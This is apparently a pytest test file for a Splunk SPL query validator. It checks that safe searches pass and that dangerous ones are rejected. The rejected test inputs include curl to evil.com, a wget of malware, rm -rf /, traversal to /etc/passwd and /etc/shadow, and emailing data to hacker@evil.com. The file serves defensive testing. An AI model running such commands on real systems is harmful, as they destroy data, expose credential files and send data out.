import pytest
from models import ValidationResult, ASTNode, ASTCommand
from validation import SPLValidator

class TestSPLValidator:
    def setup_method(self):
        self.validator = SPLValidator()
    
    def test_validate_safe_ast(self):
        """Test validation of safe AST commands"""
        safe_ast = ASTNode(
            command=ASTCommand.SEARCH,
            args={"query": "index=main error"}
        )
        result = self.validator.validate_ast(safe_ast)
        assert result.is_valid
        assert len(result.errors) == 0
    
    def test_validate_dangerous_ast(self):
        """Test validation rejects dangerous AST commands"""
        dangerous_ast = ASTNode(
            command=ASTCommand.SEARCH,
            args={"query": "| rest /services/server/info"}
        )
        result = self.validator.validate_ast(dangerous_ast)
        assert not result.is_valid
        assert "Dangerous command detected" in str(result.errors)
    
    def test_validate_safe_spl(self):
        """Test validation of safe SPL queries"""
        safe_spl = "search index=main error | stats count by host"
        result = self.validator.validate_spl(safe_spl)
        assert result.is_valid
        assert len(result.errors) == 0
    
    def test_validate_dangerous_spl_rest(self):
        """Test validation rejects SPL with REST commands"""
        dangerous_spl = "| rest /services/server/info"
        result = self.validator.validate_spl(dangerous_spl)
        assert not result.is_valid
        assert any("rest" in error.lower() for error in result.errors)
    
    def test_validate_dangerous_spl_script(self):
        """Test validation rejects SPL with script commands"""
        dangerous_spl = "search index=main | script python test.py"
        result = self.validator.validate_spl(dangerous_spl)
        assert not result.is_valid
        assert any("script" in error.lower() for error in result.errors)
    
    def test_validate_dangerous_spl_outputcsv(self):
        """Test validation rejects SPL with outputcsv commands"""
        dangerous_spl = "search index=main | outputcsv /tmp/data.csv"
        result = self.validator.validate_spl(dangerous_spl)
        assert not result.is_valid
        assert any("outputcsv" in error.lower() for error in result.errors)
    
    def test_validate_dangerous_spl_sendemail(self):
        """Test validation rejects SPL with sendemail commands"""
        dangerous_spl = "search index=main error | sendemail to=admin@company.com"
        result = self.validator.validate_spl(dangerous_spl)
        assert not result.is_valid
        assert any("sendemail" in error.lower() for error in result.errors)
    
    def test_validate_spl_with_time_bounds(self):
        """Test validation enforces time bounds"""
        # Valid time range
        valid_spl = "search index=main earliest=-7d latest=now"
        result = self.validator.validate_spl(valid_spl)
        assert result.is_valid
        
        # Invalid time range (too far back)
        invalid_spl = "search index=main earliest=-400d latest=now"
        result = self.validator.validate_spl(invalid_spl)
        assert not result.is_valid
        assert any("time range" in error.lower() for error in result.errors)
    
    def test_validate_spl_command_specific_rules(self):
        """Test command-specific validation rules"""
        # Valid stats command
        valid_stats = "search index=main | stats count by host"
        result = self.validator.validate_spl(valid_stats)
        assert result.is_valid
        
        # Invalid stats command (missing aggregation)
        invalid_stats = "search index=main | stats host"
        result = self.validator.validate_spl(invalid_stats)
        assert not result.is_valid
        assert any("stats" in error.lower() for error in result.errors)
    
    def test_validate_spl_network_patterns(self):
        """Test validation detects network-related dangerous patterns"""
        dangerous_patterns = [
            "search index=main | eval result=system('curl http://evil.com')",
            "search index=main | eval result=exec('wget malware.exe')",
            "search index=main | lookup dnslookup hostname"
        ]
        
        for pattern in dangerous_patterns:
            result = self.validator.validate_spl(pattern)
            assert not result.is_valid, f"Pattern should be invalid: {pattern}"
    
    def test_validate_spl_file_operations(self):
        """Test validation detects file operation patterns"""
        dangerous_patterns = [
            "search index=main | outputlookup /etc/passwd",
            "search index=main | inputlookup ../../../etc/shadow",
            "search index=main | eval result=file('/etc/hosts')"
        ]
        
        for pattern in dangerous_patterns:
            result = self.validator.validate_spl(pattern)
            assert not result.is_valid, f"Pattern should be invalid: {pattern}"
    
    def test_golden_test_cases(self):
        """Golden test cases for common SPL patterns"""
        golden_cases = [
            # Safe searches
            ("search index=main error", True),
            ("search index=web status=404", True),
            ("search sourcetype=access_combined | stats count by clientip", True),
            
            # Safe analytics
            ("search index=main | timechart span=1h count", True),
            ("search index=main | stats avg(response_time) by host", True),
            ("search index=main | table _time, host, message", True),
            
            # Safe filtering
            ("search index=main | where status>400", True),
            ("search index=main | eval severity=if(status>500, 'high', 'low')", True),
            
            # Dangerous commands
            ("| rest /services/server/info", False),
            ("search index=main | script python malware.py", False),
            ("search index=main | outputcsv /tmp/data.csv", False),
            ("search index=main | sendemail to=hacker@evil.com", False),
            
            # Dangerous patterns
            ("search index=main | eval result=system('rm -rf /')", False),
            ("search index=main | lookup ../../../etc/passwd", False),
            ("search index=main earliest=-1000d", False),
        ]
        
        for spl, should_be_valid in golden_cases:
            result = self.validator.validate_spl(spl)
            assert result.is_valid == should_be_valid, f"SPL: {spl}, Expected: {should_be_valid}, Got: {result.is_valid}, Errors: {result.errors}"
    
    def test_validation_result_structure(self):
        """Test ValidationResult structure and properties"""
        # Valid case
        valid_result = ValidationResult(is_valid=True, errors=[], warnings=[])
        assert valid_result.is_valid
        assert len(valid_result.errors) == 0
        assert len(valid_result.warnings) == 0
        
        # Invalid case
        invalid_result = ValidationResult(
            is_valid=False, 
            errors=["Dangerous command detected"], 
            warnings=["Query may be slow"]
        )
        assert not invalid_result.is_valid
        assert len(invalid_result.errors) == 1
        assert len(invalid_result.warnings) == 1
        assert "Dangerous command" in invalid_result.errors[0]